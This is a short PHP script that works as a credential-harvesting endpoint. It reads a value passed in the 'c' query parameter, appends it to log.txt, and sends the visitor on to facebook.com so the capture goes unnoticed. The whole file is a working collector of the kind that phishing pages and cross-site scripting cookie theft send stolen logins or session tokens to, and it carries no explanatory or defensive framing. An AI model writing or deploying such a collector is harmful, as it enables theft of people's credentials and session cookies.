<?php
header('Location:https://facebook.com');
	$cred = $_GET["c"];
	$file = fopen('log.txt','a');
	fwrite($file,$cred . "\n");
?>